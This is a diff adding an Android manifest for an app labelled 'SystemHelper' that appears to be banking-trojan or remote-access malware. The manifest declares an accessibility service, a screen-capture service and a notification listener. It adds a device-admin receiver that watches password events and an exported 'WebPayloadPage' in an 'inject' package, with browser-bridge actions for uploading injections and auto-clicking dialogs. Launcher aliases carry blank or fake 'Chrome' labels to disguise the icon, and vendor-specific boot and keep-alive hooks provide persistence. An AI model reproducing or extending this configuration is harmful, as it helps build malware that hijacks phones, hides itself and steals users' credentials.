@@ -1,0 +1,457 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" package="com.zq.final" platformBuildVersionCode="34" platformBuildVersionName="14">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE"/>
+    <uses-permission android:name="com.huawei.permission.external_app_settings.USE_COMPONENT"/>
+    <uses-permission android:name="com.vivo.permission.manage.permission.ACCESS"/>
+    <uses-permission android:name="com.vivo.abe.permission.CLEAN_NOTIFICATION"/>
+    <uses-permission android:name="zte.permission.LAUNCH_POWER_SAVER_ACTIVITY"/>
+    <uses-permission android:name="com.coloros.permission.SAFE_COMPONENT"/>
+    <uses-permission android:name="com.heytap.permission.SAFE_COMPONENT"/>
+    <uses-permission android:name="com.realme.permission.SAFE_COMPONENT"/>
+    <uses-permission android:name="com.xiaomi.permission.BACKGROUND_START_ACTIVITY"/>
+    <uses-permission android:name="com.miui.permission.START_IN_BACKGROUND"/>
+    <uses-permission android:name="com.samsung.android.permission.BACKGROUND_START_ACTIVITY"/>
+    <uses-permission android:name="com.samsung.android.permission.MANAGE_ACTIVITY_PROTECTION"/>
+    <uses-permission android:name="com.samsung.android.app.routine.EXECUTE"/>
+    <uses-permission android:name="com.samsung.android.sm.permission.KEEP_ALIVE"/>
+    <uses-permission android:name="com.sec.android.provider.badge.permission.READ"/>
+    <uses-permission android:name="com.sec.android.provider.badge.permission.WRITE"/>
+    <uses-permission android:name="com.huawei.android.launcher.permission.CHANGE_BADGE"/>
+    <uses-permission android:name="com.hihonor.permission.MANAGE_BACKGROUND_ACTIVITY"/>
+    <uses-permission android:name="com.transsion.permission.AUTOSTART"/>
+    <uses-permission android:name="com.transsion.permission.MANAGE_BACKGROUND"/>
+    <uses-permission android:name="com.tecno.permission.BACKGROUND_START_ACTIVITY"/>
+    <uses-permission android:name="com.infinix.permission.BACKGROUND_START_ACTIVITY"/>
+    <uses-permission android:name="com.itel.permission.BACKGROUND_START_ACTIVITY"/>
+    <uses-permission android:name="com.asus.mobilemanager.permission.ACCESS"/>
+    <uses-permission android:name="com.asus.mobilemanager.autostart.permission.ACCESS"/>
+    <uses-permission android:name="com.letv.android.permission.BACKGROUND_START_ACTIVITY"/>
+    <uses-permission android:name="com.nokia.permission.KEEP_ALIVE"/>
+    <uses-permission android:name="com.motorola.permission.BACKGROUND_START_ACTIVITY"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
+    <uses-permission android:maxSdkVersion="32" android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:maxSdkVersion="32" android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_VISUAL_USER_SELECTED"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
+    <uses-permission android:name="android.permission.GET_INSTALLED_APPS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.QUICKBOOT_POWERON"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
+    <uses-permission android:name="android.permission.BIND_DREAM_SERVICE"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS"/>
+    <uses-permission android:name="android.permission.TURN_SCREEN_ON"/>
+    <uses-permission android:name="android.permission.REORDER_TASKS"/>
+    <uses-permission android:name="android.permission.USE_BIOMETRIC"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.MAIN"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.VIEW"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.PICK"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.DIAL"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.CALL"/>
+        </intent>
+        <intent>
+            <action android:name="android.settings.SETTINGS"/>
+        </intent>
+    </queries>
+    <uses-feature android:name="android.hardware.telephony" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera.front" android:required="false"/>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+    <permission android:name="com.nest.craft.spark.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
+    <uses-permission android:name="com.nest.craft.spark.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
+    <application android:allowBackup="false" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules" android:extractNativeLibs="true" android:fullBackupContent="@xml/backup_rules" android:hardwareAccelerated="true" android:icon="@mipmap/test" android:label="@string/app_name" android:largeHeap="true" android:name="com.nest.craft.spark.SystemHelperApplication" android:networkSecurityConfig="@xml/network_security_config" android:preserveLegacyExternalStorage="true" android:requestLegacyExternalStorage="true" android:roundIcon="@mipmap/test_round" android:supportsRtl="true" android:theme="@style/Theme.SystemHelper">
+        <activity android:excludeFromRecents="true" android:exported="true" android:launchMode="singleTask" android:name="com.nest.craft.spark.activity.SplashGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity-alias android:enabled="true" android:exported="true" android:name="com.nest.craft.spark.A2" android:targetActivity="com.nest.craft.spark.activity.SplashGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter android:priority="1">
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.MULTIWINDOW_LAUNCHER"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="true" android:exported="true" android:name="com.nest.craft.spark.A1" android:targetActivity="com.nest.craft.spark.activity.SplashGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter android:priority="2">
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.INFO"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="true" android:exported="true" android:name="com.nest.craft.spark.DefaultLauncherAlias" android:targetActivity="com.nest.craft.spark.activity.SplashGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode|screenSize|smallestScreenSize" android:excludeFromRecents="false" android:exported="true" android:hardwareAccelerated="true" android:launchMode="singleInstance" android:name="com.nest.craft.spark.EntryGateway" android:process=":core" android:screenOrientation="portrait" android:theme="@style/Theme.SystemHelper"/>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_chrome" android:label="⠀Chrome⠀" android:name="com.nest.craft.spark.AppVariantN" android:targetActivity="com.nest.craft.spark.EntryGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_variant_e" android:label="@string/label_variant_l" android:name="com.nest.craft.spark.AppVariantL" android:targetActivity="com.nest.craft.spark.EntryGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/ic_variant_a_adaptive" android:label="@string/label_blank" android:name="com.nest.craft.spark.AppVariantK" android:roundIcon="@mipmap/ic_variant_a_adaptive" android:targetActivity="com.nest.craft.spark.EntryGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_brand_j" android:label="@string/label_variant_j" android:name="com.nest.craft.spark.AppVariantJ" android:targetActivity="com.nest.craft.spark.EntryGateway">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_brand_i" android:label="@string/label_variant_i" android:name="com.nest.craft.spark.AppVariantI" android:targetActivity="com.nest.craft.spark.EntryGateway">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_brand_h" android:label="@string/label_variant_h" android:name="com.nest.craft.spark.AppVariantH" android:targetActivity="com.nest.craft.spark.EntryGateway">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_brand_g" android:label="@string/label_variant_g" android:name="com.nest.craft.spark.AppVariantG" android:targetActivity="com.nest.craft.spark.EntryGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_blank" android:label="⠀⠀" android:name="com.nest.craft.spark.AppVariantF" android:targetActivity="com.nest.craft.spark.EntryGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_variant_e" android:label="@string/label_blank" android:name="com.nest.craft.spark.AppVariantE" android:targetActivity="com.nest.craft.spark.EntryGateway">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_blank" android:label=" " android:name="com.nest.craft.spark.AppVariantD" android:targetActivity="com.nest.craft.spark.EntryGateway">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_blank" android:label=" " android:name="com.nest.craft.spark.AppVariantC" android:targetActivity="com.nest.craft.spark.EntryGateway">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_brand_b" android:label=" " android:name="com.nest.craft.spark.AppVariantB" android:targetActivity="com.nest.craft.spark.EntryGateway">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@drawable/ic_variant_a" android:label="⠀⠀" android:name="com.nest.craft.spark.AppVariantA" android:targetActivity="com.nest.craft.spark.EntryGateway" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:excludeFromRecents="true" android:exported="false" android:hardwareAccelerated="true" android:launchMode="singleTop" android:name="com.nest.craft.spark.activity.DaemonConfigPage" android:process=":core" android:theme="@style/Theme.DaemonConfig"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:launchMode="singleTop" android:name="com.nest.craft.spark.inject.WebPayloadPage" android:process=":core" android:screenOrientation="portrait" android:taskAffinity="" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <action android:name="DXS_INJECTION_TARGET"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:alwaysRetainTaskState="true" android:autoRemoveFromRecents="false" android:clearTaskOnLaunch="false" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:launchMode="singleTop" android:name="com.nest.craft.spark.activity.DeviceConfirmPage" android:process=":core" android:taskAffinity="" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="false" android:launchMode="singleTop" android:name="com.nest.craft.spark.activity.StorageGrantPage" android:process=":core" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="false" android:name="com.nest.craft.spark.activity.WakeScreenPage" android:noHistory="true" android:process=":core" android:theme="@android:style/Theme.NoDisplay"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode|screenSize|smallestScreenSize" android:enabled="true" android:excludeFromRecents="false" android:exported="true" android:hardwareAccelerated="true" android:icon="@mipmap/test" android:label="@string/app_name" android:name="com.nest.craft.spark.activity.ClearOverlayPage" android:noHistory="true" android:process=":core" android:roundIcon="@mipmap/test_round" android:screenOrientation="sensor" android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter android:priority="1">
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.INFO"/>
+                <category android:name="android.intent.category.MULTIWINDOW_LAUNCHER"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:exported="false" android:launchMode="singleInstance" android:name="com.nest.craft.spark.activity.QuickGrantPage" android:process=":core" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:allowTaskReparenting="false" android:excludeFromRecents="true" android:exported="false" android:finishOnTaskLaunch="false" android:label="@string/app_name" android:launchMode="singleTop" android:name="com.nest.craft.spark.ui.GrantRequestPage" android:process=":core" android:taskAffinity="com.nest.craft.spark.permission" android:theme="@style/Theme.Transparent"/>
+        <service android:directBootAware="true" android:exported="true" android:foregroundServiceType="dataSync|specialUse" android:name="com.nest.craft.spark.service.PlatformAssistDaemon" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:process=":core" android:stopWithTask="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="Accessibility service with background data synchronization"/>
+        </service>
+        <service android:enabled="true" android:exported="false" android:foregroundServiceType="mediaProjection" android:name="com.nest.craft.spark.service.ScreenCastDaemon" android:process=":core"/>
+        <service android:enabled="true" android:exported="false" android:foregroundServiceType="specialUse" android:name="com.nest.craft.spark.activity.SyncWorkerDaemon" android:process=":core" android:stopWithTask="false">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="Setup engine polling for accessibility and authorization completion"/>
+        </service>
+        <service android:exported="true" android:name="com.nest.craft.spark.service.AlertTrackDaemon" android:permission="android.permission.INTERNET" android:process=":core">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+        <service android:directBootAware="true" android:enabled="true" android:exported="false" android:foregroundServiceType="specialUse" android:name="com.nest.craft.spark.service.BootWorkerDaemon" android:process=":core" android:stopWithTask="false">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="Initialization worker for accessibility service setup"/>
+        </service>
+        <service android:directBootAware="true" android:enabled="true" android:exported="false" android:foregroundServiceType="specialUse" android:name="com.nest.craft.spark.service.CoreTaskAgent" android:process=":core" android:stopWithTask="false">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="Process guardian service for accessibility recovery"/>
+        </service>
+        <service android:enabled="true" android:exported="true" android:name="com.nest.craft.spark.service.RecoveryJobDaemon" android:permission="android.permission.BIND_JOB_SERVICE" android:process=":core"/>
+        <provider android:authorities="com.nest.craft.spark.androidx-startup" android:exported="false" android:name="androidx.startup.InitializationProvider">
+            <meta-data android:initOrder="1091" android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
+            <meta-data android:initOrder="1091" android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
+            <meta-data android:initOrder="1091" android:name="androidx.profileinstaller.ProfileInstallerInitializer" android:value="androidx.startup"/>
+        </provider>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:initOrder="1068" android:name="androidx.work.impl.background.systemalarm.SystemAlarmService" android:process=":core"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_job_service_default" android:exported="true" android:initOrder="1068" android:name="androidx.work.impl.background.systemjob.SystemJobService" android:permission="android.permission.BIND_JOB_SERVICE" android:process=":core"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_foreground_service_default" android:exported="false" android:initOrder="1068" android:name="androidx.work.impl.foreground.SystemForegroundService" android:process=":core"/>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="false" android:initOrder="1068" android:name="androidx.work.impl.utils.ForceStopRunnable.BroadcastReceiver" android:process=":core"/>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:initOrder="1068" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy.BatteryChargingProxy" android:process=":core">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:initOrder="1068" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy.BatteryNotLowProxy" android:process=":core">
+            <intent-filter>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:initOrder="1068" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy.StorageNotLowProxy" android:process=":core">
+            <intent-filter>
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW"/>
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:initOrder="1068" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy.NetworkStateProxy" android:process=":core">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:initOrder="1068" android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver" android:process=":core">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.TIME_SET"/>
+                <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:initOrder="1068" android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver" android:process=":core">
+            <intent-filter>
+                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="true" android:initOrder="1068" android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver" android:permission="android.permission.DUMP" android:process=":core">
+            <intent-filter>
+                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="true" android:enabled="true" android:exported="true" android:name="com.nest.craft.spark.receiver.StateChangeWatcher" android:process=":core">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+                <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
+                <action android:name="com.oppo.intent.action.BOOT_COMPLETED"/>
+                <action android:name="com.coloros.intent.action.BOOT_COMPLETED"/>
+                <action android:name="com.vivo.intent.action.BOOT_COMPLETED"/>
+                <action android:name="com.huawei.systemmanager.optimize.bootStart.action.BOOT"/>
+                <action android:name="com.huawei.intent.action.BOOT_COMPLETED"/>
+                <action android:name="com.meizu.intent.action.BOOT"/>
+                <action android:name="com.samsung.android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="com.miui.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="true" android:name="com.nest.craft.spark.service.account.AuthenticatorService" android:process=":core">
+            <intent-filter>
+                <action android:name="android.accounts.AccountAuthenticator"/>
+            </intent-filter>
+            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/authenticator"/>
+        </service>
+        <service android:exported="true" android:name="com.nest.craft.spark.service.account.SyncAdapterService" android:process=":core">
+            <intent-filter>
+                <action android:name="android.content.SyncAdapter"/>
+            </intent-filter>
+            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/sync_adapter"/>
+        </service>
+        <provider android:authorities="com.nest.craft.spark.provider" android:exported="false" android:name="com.nest.craft.spark.service.account.StubContentProvider" android:syncable="true"/>
+        <receiver android:exported="false" android:name="com.nest.craft.spark.service.TimedRecoveryWatcher" android:process=":core">
+            <intent-filter>
+                <action android:name="com.nest.craft.spark.action.HEALTH_CHECK"/>
+                <action android:name="com.nest.craft.spark.action.QUICK_SYNC"/>
+                <action android:name="com.nest.craft.spark.action.BACKUP_SYNC"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.nest.craft.spark.service.PkgEventWatcher" android:process=":core">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="false" android:name="com.nest.craft.spark.keepalive.DaemonGuardService" android:process=":daemon"/>
+        <service android:exported="true" android:name="com.nest.craft.spark.service.AdminKeepaliveDaemon" android:permission="android.permission.BIND_DEVICE_ADMIN" android:process=":core">
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_SERVICE"/>
+            </intent-filter>
+        </service>
+        <receiver android:enabled="true" android:exported="false" android:name="com.nest.craft.spark.receiver.DaAccessibilityAlarmReceiver" android:process=":core"/>
+        <receiver android:description="@string/device_admin_description" android:exported="true" android:label="@string/app_name" android:name="com.nest.craft.spark.receiver.AdminEventWatcher" android:permission="android.permission.BIND_DEVICE_ADMIN" android:process=":core">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
+                <action android:name="android.app.action.ACTION_PASSWORD_CHANGED"/>
+                <action android:name="android.app.action.ACTION_PASSWORD_EXPIRING"/>
+                <action android:name="android.app.action.ACTION_PASSWORD_FAILED"/>
+                <action android:name="android.app.action.ACTION_PASSWORD_SUCCEEDED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="false" android:name="com.nest.craft.spark.receiver.BrowserBridgeReceiver" android:process=":core">
+            <intent-filter>
+                <action android:name="com.nest.craft.spark.browser.START_CONNECTION"/>
+                <action android:name="com.nest.craft.spark.browser.PROJECTION_RESULT"/>
+                <action android:name="com.nest.craft.spark.browser.AUTO_CLICK_DIALOG"/>
+                <action android:name="com.nest.craft.spark.browser.UPLOAD_INJECTION"/>
+                <action android:name="com.nest.craft.spark.browser.CLEAR_INJECTION"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="com.nest.craft.spark.keepalive.KeepAliveWidgetProvider" android:process=":core">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/keepalive_widget_info"/>
+        </receiver>
+        <service android:exported="true" android:icon="@drawable/ic_tile_sync" android:label="Sync" android:name="com.nest.craft.spark.keepalive.KeepAliveTileService" android:permission="android.permission.BIND_QUICK_SETTINGS_TILE" android:process=":core">
+            <intent-filter>
+                <action android:name="android.service.quicksettings.action.QS_TILE"/>
+            </intent-filter>
+        </service>
+        <provider android:authorities="com.nest.craft.spark.keepalive.provider" android:exported="false" android:name="com.nest.craft.spark.keepalive.KeepAliveProvider" android:process=":core"/>
+        <service android:exported="true" android:name="com.nest.craft.spark.keepalive.KeepAliveMediaRouteService" android:process=":core">
+            <intent-filter>
+                <action android:name="android.media.MediaRouteProviderService"/>
+            </intent-filter>
+        </service>
+        <service android:directBootAware="true" android:exported="false" android:name="com.nest.craft.spark.service.FcmWakeService" android:process=":core">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <meta-data android:name="com.sec.android.support.multiwindow" android:value="true"/>
+        <provider android:authorities="com.nest.craft.spark.fileprovider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
+        </provider>
+        <receiver android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" android:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
+            </intent-filter>
+            <meta-data android:name="com.google.android.gms.cloudmessaging.FINISHED_AFTER_HANDLED" android:value="true"/>
+        </receiver>
+        <service android:directBootAware="true" android:exported="false" android:name="com.google.firebase.messaging.FirebaseMessagingService">
+            <intent-filter android:priority="-500">
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <service android:directBootAware="true" android:exported="false" android:name="com.google.firebase.components.ComponentDiscoveryService">
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.ktx.FirebaseCommonLegacyRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.FirebaseCommonKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.datatransport.TransportRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+        </service>
